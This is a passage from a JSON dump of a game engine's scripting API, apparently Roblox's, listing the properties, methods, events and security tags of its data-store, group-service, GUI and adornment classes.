OrderedDataStore","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"bool","Name":"ascending","Default":null},{"Type":"int","Name":"pagesize","Default":null},{"Type":"Variant","Name":"minValue","Default":null},{"Type":"Variant","Name":"maxValue","Default":null}],"Name":"GetSortedAsync","tags":[],"Class":"OrderedDataStore","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GoogleAnalyticsConfiguration","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GroupService","tags":["notCreatable"]},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetAlliesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetEnemiesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetGroupInfoAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGroupsAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GuiBase","tags":[]},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase2d","tags":["notbrowsable"]},{"ValueType":"Vector2","type":"Property","Name":"AbsolutePosition","tags":["readonly"],"Class":"GuiBase2d"},{"ValueType":"float","type":"Property","Name":"AbsoluteRotation","tags":["readonly"],"Class":"GuiBase2d"},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteSize","tags":["readonly"],"Class":"GuiBase2d"},{"ValueType":"bool","type":"Property","Name":"Localize","tags":["hidden"],"Class":"GuiBase2d"},{"Superclass":"GuiBase2d","type":"Class","Name":"GuiObject","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"GuiObject"},{"ValueType":"Vector2","type":"Property","Name":"AnchorPoint","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BackgroundColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BackgroundColor3","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"BackgroundTransparency","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BorderColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BorderColor3","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"BorderSizePixel","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"ClipsDescendants","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Draggable","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"LayoutOrder","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionDown","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionLeft","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionRight","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionUp","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Position","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Rotation","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Selectable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"GuiObject"},{"ValueType":"SizeConstraint","type":"Property","Name":"SizeConstraint","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"SizeFromContents","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":["hidden"],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"GuiObject"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenPosition","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSize","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSizeAndPosition","tags":[],"Class":"GuiObject","type":"Function"},{"Arguments":[{"Name":"initialPosition","Type":"UDim2"}],"Name":"DragBegin","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"DragStopped","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputBegan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputChanged","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputEnded","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseEnter","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseLeave","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseMoved","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelBackward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelForward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionGained","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionLost","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchLongPress","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPinch","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchRotate","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"}],"Name":"TouchSwipe","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"}],"Name":"TouchTap","tags":[],"Class":"GuiObject","type":"Event"},{"Superclass":"GuiObject","type":"Class","Name":"Frame","tags":[]},{"ValueType":"FrameStyle","type":"Property","Name":"Style","tags":[],"Class":"Frame"},{"Superclass":"GuiObject","type":"Class","Name":"GuiButton","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"AutoButtonColor","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Modal","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Selected","tags":[],"Class":"GuiButton"},{"ValueType":"ButtonStyle","type":"Property","Name":"Style","tags":[],"Class":"GuiButton"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"verb","Default":null}],"Name":"SetVerb","tags":["RobloxScriptSecurity"],"Class":"GuiButton","type":"Function"},{"Arguments":[{"Name":"inputObject","Type":"Instance"}],"Name":"Activated","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[],"Name":"MouseButton1Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Up","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[],"Name":"MouseButton2Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Up","tags":[],"Class":"GuiButton","type":"Event"},{"Superclass":"GuiButton","type":"Class","Name":"ImageButton","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageButton"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageButton"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageButton"},{"ValueType":"bool","type":"Property","Name":"IsLoaded","tags":["readonly"],"Class":"ImageButton"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageButton"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageButton"},{"ValueType":"UDim2","type":"Property","Name":"TileSize","tags":[],"Class":"ImageButton"},{"Superclass":"GuiButton","type":"Class","Name":"TextButton","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextButton"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":["deprecated"],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"LineHeight","tags":[],"Class":"TextButton"},{"ValueType":"string","type":"Property","Name":"LocalizedText","tags":["hidden","readonly"],"Class":"TextButton"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextButton"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextButton"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextSize","tags":[],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextButton"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextButton"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextButton"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null}],"Name":"SetTextFromInput","tags":["RobloxScriptSecurity"],"Class":"TextButton","type":"Function"},{"Superclass":"GuiObject","type":"Class","Name":"GuiLabel","tags":[]},{"Superclass":"GuiLabel","type":"Class","Name":"ImageLabel","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageLabel"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageLabel"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageLabel"},{"ValueType":"bool","type":"Property","Name":"IsLoaded","tags":["readonly"],"Class":"ImageLabel"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageLabel"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageLabel"},{"ValueType":"UDim2","type":"Property","Name":"TileSize","tags":[],"Class":"ImageLabel"},{"Superclass":"GuiLabel","type":"Class","Name":"TextLabel","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextLabel"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":["deprecated"],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"LineHeight","tags":[],"Class":"TextLabel"},{"ValueType":"string","type":"Property","Name":"LocalizedText","tags":["hidden","readonly"],"Class":"TextLabel"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextLabel"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextSize","tags":[],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextLabel"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextLabel"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextLabel"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null}],"Name":"SetTextFromInput","tags":["RobloxScriptSecurity"],"Class":"TextLabel","type":"Function"},{"Superclass":"GuiObject","type":"Class","Name":"Scale9Frame","tags":[]},{"ValueType":"Vector2int16","type":"Property","Name":"ScaleEdgeSize","tags":[],"Class":"Scale9Frame"},{"ValueType":"string","type":"Property","Name":"SlicePrefix","tags":[],"Class":"Scale9Frame"},{"Superclass":"GuiObject","type":"Class","Name":"ScrollingFrame","tags":[]},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteWindowSize","tags":["readonly"],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"BottomImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Vector2","type":"Property","Name":"CanvasPosition","tags":[],"Class":"ScrollingFrame"},{"ValueType":"UDim2","type":"Property","Name":"CanvasSize","tags":[],"Class":"ScrollingFrame"},{"ValueType":"ScrollBarInset","type":"Property","Name":"HorizontalScrollBarInset","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"MidImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"int","type":"Property","Name":"ScrollBarThickness","tags":[],"Class":"ScrollingFrame"},{"ValueType":"bool","type":"Property","Name":"ScrollingEnabled","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"TopImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"ScrollBarInset","type":"Property","Name":"VerticalScrollBarInset","tags":[],"Class":"ScrollingFrame"},{"ValueType":"VerticalScrollBarPosition","type":"Property","Name":"VerticalScrollBarPosition","tags":[],"Class":"ScrollingFrame"},{"Superclass":"GuiObject","type":"Class","Name":"TextBox","tags":[]},{"ValueType":"bool","type":"Property","Name":"ClearTextOnFocus","tags":[],"Class":"TextBox"},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextBox"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":["deprecated"],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"LineHeight","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"ManualFocusRelease","tags":["RobloxScriptSecurity"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"MultiLine","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"OverlayNativeInput","tags":["RobloxScriptSecurity"],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"PlaceholderColor3","tags":[],"Class":"TextBox"},{"ValueType":"string","type":"Property","Name":"PlaceholderText","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"ShowNativeInput","tags":[],"Class":"TextBox"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextBox"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextBox"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextSize","tags":[],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextBox"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextBox"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextBox"},{"ReturnType":"void","Arguments":[],"Name":"CaptureFocus","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFocused","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"submitted","Default":"false"}],"Name":"ReleaseFocus","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null}],"Name":"SetTextFromInput","tags":["RobloxScriptSecurity"],"Class":"TextBox","type":"Function"},{"Arguments":[{"Name":"enterPressed","Type":"bool"},{"Name":"inputThatCausedFocusLoss","Type":"Instance"}],"Name":"FocusLost","tags":[],"Class":"TextBox","type":"Event"},{"Arguments":[],"Name":"Focused","tags":[],"Class":"TextBox","type":"Event"},{"Superclass":"GuiBase2d","type":"Class","Name":"LayerCollector","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"LayerCollector"},{"ValueType":"ZIndexBehavior","type":"Property","Name":"ZIndexBehavior","tags":[],"Class":"LayerCollector"},{"Superclass":"LayerCollector","type":"Class","Name":"BillboardGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"ExtentsOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"ExtentsOffsetWorldSpace","tags":[],"Class":"BillboardGui"},{"ValueType":"float","type":"Property","Name":"LightInfluence","tags":[],"Class":"BillboardGui"},{"ValueType":"float","type":"Property","Name":"MaxDistance","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"PlayerToHideFrom","tags":[],"Class":"BillboardGui"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector2","type":"Property","Name":"SizeOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"StudsOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"StudsOffsetWorldSpace","tags":[],"Class":"BillboardGui"},{"Superclass":"LayerCollector","type":"Class","Name":"ScreenGui","tags":[]},{"ValueType":"int","type":"Property","Name":"DisplayOrder","tags":[],"Class":"ScreenGui"},{"ValueType":"bool","type":"Property","Name":"ResetOnSpawn","tags":[],"Class":"ScreenGui"},{"Superclass":"ScreenGui","type":"Class","Name":"GuiMain","tags":["deprecated"]},{"Superclass":"LayerCollector","type":"Class","Name":"SurfaceGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"SurfaceGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"SurfaceGui"},{"ValueType":"Vector2","type":"Property","Name":"CanvasSize","tags":[],"Class":"SurfaceGui"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceGui"},{"ValueType":"float","type":"Property","Name":"LightInfluence","tags":[],"Class":"SurfaceGui"},{"ValueType":"float","type":"Property","Name":"ToolPunchThroughDistance","tags":[],"Class":"SurfaceGui"},{"ValueType":"float","type":"Property","Name":"ZOffset","tags":[],"Class":"SurfaceGui"},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase3d","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Color","tags":["deprecated","hidden"],"Class":"GuiBase3d"},{"ValueType":"Color3","type":"Property","Name":"Color3","tags":[],"Class":"GuiBase3d"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"GuiBase3d"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiBase3d"},{"Superclass":"GuiBase3d","type":"Class","Name":"FloorWire","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"From","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":[],"Class":"FloorWire"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"FloorWire"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"To","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"WireRadius","tags":[],"Class":"FloorWire"},{"Superclass":"GuiBase3d","type":"Class","Name":"PVAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PVAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"HandleAdornment","tags":[]},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"HandleAdornment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"HandleAdornment"},{"ValueType":"Vector3","type":"Property","Name":"SizeRelativeOffset","tags":[],"Class":"HandleAdornment"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"HandleAdornment"},{"Arguments":[],"Name":"MouseButton1Down","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseButton1Up","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseEnter","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseLeave","tags":[],"Class":"HandleAdornment","type":"Event"},{"Superclass":"HandleAdornment","type":"Class","Name":"BoxHandleAdornment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BoxHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ConeHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"ConeHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"ConeHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"CylinderHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"CylinderHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"CylinderHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ImageHandleAdornment","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageHandleAdornment"},{"ValueType":"Vector2","type":"Property","Name":"Size","tags":[],"Class":"ImageHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"LineHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"LineHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"LineHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"SphereHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"SphereHandleAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"ParabolaAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"A","tags":["RobloxScriptSecurity"],"Class":"ParabolaAdornment"},{"ValueType":"float","type":"Property","Name":"B","tags":["RobloxScriptSecurity"],"Class":"ParabolaAdornment"},{"ValueType":"float","type":"Property","Name":"C","tags":["RobloxScriptSecurity"],"Class":"ParabolaAdornment"},{"ValueType":"float","type":"Property","Name":"Range","tags":["RobloxScriptSecurity"],"Class":"ParabolaAdornment"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":["RobloxScriptSecurity"],"Class":"ParabolaAdornment"},{"ReturnType":"Tuple","Arguments":[{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null}],"Name":"FindPartOnParabola","tags":["RobloxScriptSecurity"],"Class":"ParabolaAdornment","type":"Function"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionBox","tags":[]},{"ValueType":"float","type":"Property","Name":"LineThickness","tags":[],"Class":"SelectionBox"},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionBox"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionBox"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionBox"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionSphere","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionSphere"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionSphere"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionSphere"},{"Superclass":"GuiBase3d","type":"Class","Name":"PartAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PartAdornment"},{"Superclass":"PartAdornment","type":"Class","Name":"HandlesBase","tags":[]},{"Superclass":"HandlesBase","type":"Class","Name":"ArcHandles","tags":[]},{"ValueType":"Axes","type":"Property","Name":"Axes","tags":[],"Class":"ArcHandles"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Down","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Up","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"},{"Name":"relativeAngle","Type":"float"},{"Name":"deltaRadius","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseEnter","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseLeave","tags":[],"Class":"ArcHandles","type":"Event"},{"Superclass":"HandlesBase","type":"Class","Name":"Handles","tags":[]},{"ValueType":"Faces","type":"Property","Name":"Faces","tags":[],"Class":"Handles"},{"ValueType":"HandlesStyle","type":"Property","Name":"Style","tags":[],"Class":"Handles"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Down","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Up","tags":[],"Class":"Handles","type":"Event"